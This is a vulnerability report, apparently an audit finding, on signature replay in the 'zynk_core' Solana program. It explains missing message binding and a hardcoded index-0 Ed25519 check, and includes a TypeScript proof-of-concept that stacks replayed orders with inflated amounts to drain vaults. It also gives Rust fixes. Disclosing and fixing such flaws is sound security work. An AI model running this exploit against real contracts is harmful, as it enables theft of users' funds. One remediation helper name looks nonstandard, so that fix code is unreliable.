# Bug Report: Insufficient Signature Binding and Index Validation Enables Indefinite Attester Signature Replay

## Executive Summary
A critical cryptographic and logical vulnerability was identified in the `zynk_core` program within `lib.rs`. The function `pull_and_create_order` implements an off-chain multi-signature mechanism requiring a valid signature from an authorized `attester` to bypass persistent state checks and execute orders transiently. 

However, due to an incomplete message serialization payload and a rigid absolute indexing architecture during the sysvar instruction validation, an attacker holding the `manager` role can indefinitely replay a single valid `attester` signature. This allows an attacker to bypass intended operational limits, alter transaction amounts, and completely drain the associated partner or operational vaults.

---

## Vulnerability Details

### 1. Weak Message Serialization (Missing Parameters Binding)
Inside the `pull_and_create_order` function (lines 395-498), if an external signature is supplied, the program generates a message string to be verified against the configured `attester` public key:

```rust
if let Some(signature) = signature {
    let message = format!("{}::{}::{}::{}", DOMAIN_SEPARATOR, beneficiary_wallet, partner_deposit_vault.key(), zynk_op_vault.key());
    verify_signature_syscall(
        ctx.accounts.sysvar_instructions.as_ref().ok_or(ProgramError::MissingRequiredSignature)?,
        &config.attester,
        message,
        signature
    )?;
    is_transient = true;
}
```

**Root Cause:** The constructed `message` variable contains only the following components:
* `DOMAIN_SEPARATOR`
* `beneficiary_wallet`
* `partner_deposit_vault.key()`
* `zynk_op_vault.key()`

Crucially, it completely omits the transaction execution context variables: `amount`, `mint`, `order_id`, `zov_id`, and any temporal/uniqueness constraints such as a `nonce`, dead-line, or expiration timestamp. 

Because of this omission, once an `attester` provides a signature to authorize a specific legitimate order routing between a partner vault and an operational vault, that signature becomes a generic wildcard voucher. It can be captured from the ledger and reused across entirely different transactions.

### 2. Absolute Transaction Index Verification (Intra-Transaction Multiplication)
The internal `verify_signature_syscall` helper validates the presence of the `Ed25519` signature verification instruction by executing:

```rust
let ed25519_instruction_result = load_instruction_at_checked(0, ix_sysvar_account);
```

**Root Cause:** The program hardcodes the lookup index to `0`. It strictly mandates that the Ed25519 instruction must occupy the absolute first slot of the Solana transaction layout. It fails to check the instruction relatively (i.e., `current_instruction_index - 1`).

Consequently, if a single valid Ed25519 instruction is placed at index `0`, it will satisfy the signature verification requirements for **every subsequent instruction** bundled within that identical atomic transaction. An attacker can stack $N$ calls to `pull_and_create_order` sequentially within one multi-instruction transaction. Each invocation will independently evaluate index `0`, find the same valid instruction, and pass the security check.

---

## Impact Analysis

### 1. Indefinite Amount Inflation (Cross-Transaction Replay)
The business intent of the `attester` role is to enforce a two-key security constraint (`manager` + `attester`) to validate that an off-chain operation matches the corresponding on-chain settlement limits. 
If an attester authorizes a transfer for a specific value (e.g., $50$ USDC), a malicious or compromised `manager` can copy that signature from a previous public transaction and package it into a new transaction. Because the `amount` is not bound to the signature hash, the manager can scale the `amount` to an arbitrary size—up to the maximum capacity of the `partner_deposit_vault` or `zov_token_account`—and drain the assets completely.

### 2. Batch Execution Multiplication (Same-Transaction Replay)
By leveraging the index `0` validation loophole, the `manager` only needs to find or extract a single valid historical signature mapping to the target accounts. By placing it at index `0`, the attacker can execute multiple `pull_and_create_order` instructions sequentially in one block. Each instruction can utilize unique `order_id` values to create separate events while reusing the same authorization token, rapidly increasing the speed of the exploit.

### 3. Protection Breakthrough of Hot Wallet Compromise
While this attack vector requires `manager` role privileges (`constraint = config.manager == manager.key()`), it represents a severe breakdown of the protocol's threat model. In production cross-chain bridge setups, the `manager` account is typically treated as an active "hot wallet" automated by a relayer engine or bot infrastructure, making it a high-priority target for hacking attempts. 
The dual-role design is meant to prevent a compromised hot wallet from acting maliciously on its own. This vulnerability eliminates that protection entirely, reducing a intended multi-sig workflow back into a single-point-of-failure hot wallet vulnerability.

---

## Proof of Concept (PoC)

The following TypeScript snippet demonstrates how an exploit transaction can be structured using the Anchor framework to execute an intra-transaction replay, bypassing the attester validation for multiple distinct, high-value transfers using a single intercepted signature:

```typescript
import * as anchor from "@coral-xyz/anchor";
import { Ed25519Program, Transaction } from "@solana/web3.js";
import { assert } from "chai";

async function performExploit(program, managerSigner, accounts, validAttesterSignature, staticMessageBytes) {
    // 1. Build the single Ed25519 instruction placed at index 0
    const ed25519Instruction = Ed25519Program.createInstructionWithPublicKey({
        publicKey: accounts.attester.publicKey,
        message: staticMessageBytes, // Contains strictly: "DOMAIN::beneficiary::pdv::zov"
        signature: validAttesterSignature,
    });

    // 2. Draft the first malicious order instruction with an arbitrary inflated amount
    const exploitOrderIx1 = await program.methods
        .pullAndCreateOrder(
            accounts.partnerId,
            anchor.web3.Keypair.generate().publicKey.toBytes(), // Fresh unique order_id
            accounts.zovId,
            true, // Enforce transient execution to bypass state storage
            new anchor.BN(5_000_000_000), // Inflated malicious amount (e.g., 5,000 tokens)
            validAttesterSignature,
            null
        )
        .accounts({
            config: accounts.config,
            manager: managerSigner.publicKey,
            partnerDepositVault: accounts.partnerDepositVault,
            pdvTokenAccount: accounts.pdvTokenAccount,
            zynkOpVault: accounts.zynkOpVault,
            zovTokenAccount: accounts.zovTokenAccount,
            beneficiary: accounts.beneficiary,
            beneficiaryTokenAccount: accounts.beneficiaryTokenAccount,
            orderTracker: accounts.orderTracker1, // First unique PDA derived from order_id
            mint: accounts.mint,
            tokenProgram: accounts.tokenProgram,
            systemProgram: anchor.web3.SystemProgram.programId,
            sysvarInstructions: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
        })
        .instruction();

    // 3. Draft a second malicious order instruction reusing the EXACT same signature and parameters
    const exploitOrderIx2 = await program.methods
        .pullAndCreateOrder(
            accounts.partnerId,
            anchor.web3.Keypair.generate().publicKey.toBytes(), // Another unique order_id
            accounts.zovId,
            true,
            new anchor.BN(10_000_000_000), // Further inflated amount (e.g., 10,000 tokens)
            validAttesterSignature,
            null
        )
        .accounts({
            config: accounts.config,
            manager: managerSigner.publicKey,
            partnerDepositVault: accounts.partnerDepositVault,
            pdvTokenAccount: accounts.pdvTokenAccount,
            zynkOpVault: accounts.zynkOpVault,
            zovTokenAccount: accounts.zovTokenAccount,
            beneficiary: accounts.beneficiary,
            beneficiaryTokenAccount: accounts.beneficiaryTokenAccount,
            orderTracker: accounts.orderTracker2, // Second unique PDA derived from order_id
            mint: accounts.mint,
            tokenProgram: accounts.tokenProgram,
            systemProgram: anchor.web3.SystemProgram.programId,
            sysvarInstructions: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
        })
        .instruction();

    // 4. Combine into an atomic transaction layout
    const exploitTx = new Transaction()
        .add(ed25519Instruction) // Index 0
        .add(exploitOrderIx1)    // Index 1 -> Reads Index 0 and passes
        .add(exploitOrderIx2);   // Index 2 -> Reads Index 0 and passes

    // Send the exploit payload
    const txSignature = await anchor.web3.sendAndConfirmTransaction(
        program.provider.connection,
        exploitTx,
        [managerSigner] // Only requires the manager hot-wallet signature
    );
    
    console.log(`Exploit executed successfully. TX: ${txSignature}`);
}
```

---

## Remediation Strategy

To fully resolve the signature replay vectors, the following structural fixes are recommended:

### 1. Expand Cryptographic Binding
Rebuild the message serialization logic within `pull_and_create_order` to integrate all vital transaction constraints. This ensures that changing any parameter invalidates the signature:

```rust
let message = format!(
    "{}::{}::{}::{}::{}::{}::{}",
    DOMAIN_SEPARATOR, 
    beneficiary_wallet, 
    partner_deposit_vault.key(),
    zynk_op_vault.key(), 
    amount, 
    mint.key(), 
    hex::encode(order_id)
);
```

### 2. Implement Stateful Replay Tracking
To prevent a valid signature from being reused across separate transactions, the `order_id` or an explicit sequence nonce should be committed to a persistent, non-closable state account (or an `init-only` PDA layout). If a transaction attempts to use an already registered or closed `order_id`, the program must revert immediately.

### 3. Dynamic Relative Index Parsing
Modify `verify_signature_syscall` to fetch the executing transaction layout relative to the current program invocation rather than an absolute index of `0`. This ensures that every individual business instruction requires its own preceding cryptographic signature verification block:

```rust
// Obtain the current executing instruction index dynamically from the sysvar
let current_ix_idx = anchor_lang::solana_program::sysvar::instructions::get_instruction_relative_index_checked(ix_sysvar_account)?;
let target_idx = current_ix_idx.checked_sub(1).ok_or(ProgramError::InvalidInstructionData)?;

let ed25519_instruction_result = load_instruction_at_checked(target_idx as usize, ix_sysvar_account);
```
